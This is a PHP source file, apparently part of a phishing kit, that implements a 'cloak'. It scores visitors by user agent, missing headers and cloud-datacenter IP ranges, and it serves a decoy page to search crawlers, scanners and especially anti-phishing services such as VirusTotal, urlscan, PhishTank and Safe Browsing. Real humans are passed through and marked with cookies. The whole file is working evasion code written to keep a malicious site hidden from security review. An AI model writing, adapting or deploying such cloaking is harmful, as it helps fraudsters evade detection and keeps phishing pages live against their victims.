<?php
/* ═══════════════════════════════════════════════════════════════
   cloak.php — Escudo anti-bots de revisión
   Si detecta un crawler/scanner, sirve el index decoy y termina.
   Incluir AL INICIO de cada página user-facing del flujo.
   ═══════════════════════════════════════════════════════════════ */

(function() {
    // Si ya pasó la verificación en esta sesión, no re-evaluar
    if (!empty($_COOKIE['_hsid_ok'])) return;

    $ua          = $_SERVER['HTTP_USER_AGENT']      ?? '';
    $accept      = $_SERVER['HTTP_ACCEPT']          ?? '';
    $accept_lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '';
    $accept_enc  = $_SERVER['HTTP_ACCEPT_ENCODING'] ?? '';
    $raw_ip      = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
    $ip          = trim(explode(',', $raw_ip)[0]);

    $score = 0;

    // Crawlers de buscadores y redes sociales
    if (preg_match('/googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot|applebot|msnbot|facebookexternalhit|twitterbot|linkedinbot|whatsapp|telegrambot|discordbot|skypeuripreview|slackbot|pinterest|redditbot/i', $ua)) $score += 10;

    // Genéricos de scrapers / clientes HTTP / pentest
    if (preg_match('/bot|crawl|spider|scraper|fetch|curl|wget|python|java\/|ruby\b|perl\/|php-curl|lwp-|libwww|httpclient|okhttp|axios\/|go-http|node-fetch|scrapy|masscan|nikto|sqlmap|nmap|zgrab|nuclei|burp|acunetix|qualys/i', $ua)) $score += 8;

    // Headless browsers
    if (preg_match('/headlesschrome|headless|phantomjs|puppeteer|playwright|selenium|webdriver|cypress|electron/i', $ua)) $score += 10;

    // SEO / análisis
    if (preg_match('/semrushbot|ahrefsbot|mj12bot|dotbot|rogerbot|majestic|blexbot|petalbot|sistrix|seznambot|exabot|gigabot/i', $ua)) $score += 10;

    // ⚠️ Bots de seguridad anti-phishing (los más importantes a bloquear)
    if (preg_match('/virustotal|urlscan|phishtank|safebrowsing|netcraft|fortiguard|kaspersky|trendmicro|sophos|symantec|mcafee|avast|avira|eset|bitdefender|webroot|paloalto|cisco|talos|umbrella|opendns|barracuda|proofpoint|mimecast|abuse|spamhaus|surbl/i', $ua)) $score += 15;

    // UA muy corto/vacío (típico de scripts)
    if (strlen(trim($ua)) < 10) $score += 8;
    if (empty(trim($accept_lang))) $score += 5;
    if (empty(trim($accept_enc))) $score += 2;
    if (empty($accept) || stripos($accept, 'text/html') === false) $score += 3;

    // Rangos de datacenter (Hetzner, DO, Linode, OVH, AWS, GCP, Azure, etc.)
    $dc = [
        '104.131.','134.209.','157.230.','159.89.','167.99.','64.227.','68.183.', // DigitalOcean
        '45.33.','45.79.','45.56.','45.118.','139.144.','172.104.','172.105.',     // Linode
        '51.75.','51.91.','51.158.','149.202.','51.68.','51.83.',                  // OVH
        '35.190.','34.96.','35.184.','35.224.','35.232.','35.236.','35.243.','104.196.','35.197.','35.198.','35.199.','35.200.','35.201.','35.202.','35.203.','35.204.','35.205.','35.206.','35.207.','35.208.','35.209.','35.210.','35.211.','35.212.','35.213.','35.214.','35.215.','35.216.','35.217.','35.218.','35.219.','35.220.','35.221.','35.222.','35.223.','35.225.','35.226.','35.227.','35.228.','35.229.','35.230.','35.231.','35.233.','35.234.','35.235.','35.237.','35.238.','35.239.','35.240.','35.241.','35.242.','35.244.','35.245.','35.246.','35.247.', // GCP
        '13.','52.','54.','3.','18.','99.','107.','176.32.',                      // AWS
        '20.','40.','51.','52.','104.40.','104.41.','104.42.','104.43.','104.44.','104.45.','104.46.','104.47.', // Azure
        '188.166.','46.101.','138.197.',                                           // DO
        '5.196.','5.39.','5.135.',                                                 // OVH extra
    ];
    foreach ($dc as $p) { if (str_starts_with($ip, $p)) { $score += 5; break; } }

    // Cookie de humano confirmado (puesta abajo)
    if (isset($_COOKIE['_hsid'])) $score -= 6;

    $is_bot = ($score >= 4);

    if ($is_bot) {
        error_log("CLOAK BLOCK: UA='$ua' IP='$ip' score=$score path=" . ($_SERVER['REQUEST_URI'] ?? ''));
        $decoy = __DIR__ . '/../index.php';
        if (file_exists($decoy)) {
            require $decoy;
        } else {
            http_response_code(404);
            echo 'Not Found';
        }
        exit;
    }

    // Humano: marcar con cookies para no re-evaluar
    if (!isset($_COOKIE['_hsid'])) {
        setcookie('_hsid', bin2hex(random_bytes(6)), time() + 86400 * 60, '/', '', false, true);
    }
    setcookie('_hsid_ok', '1', time() + 86400, '/', '', false, true);
})();
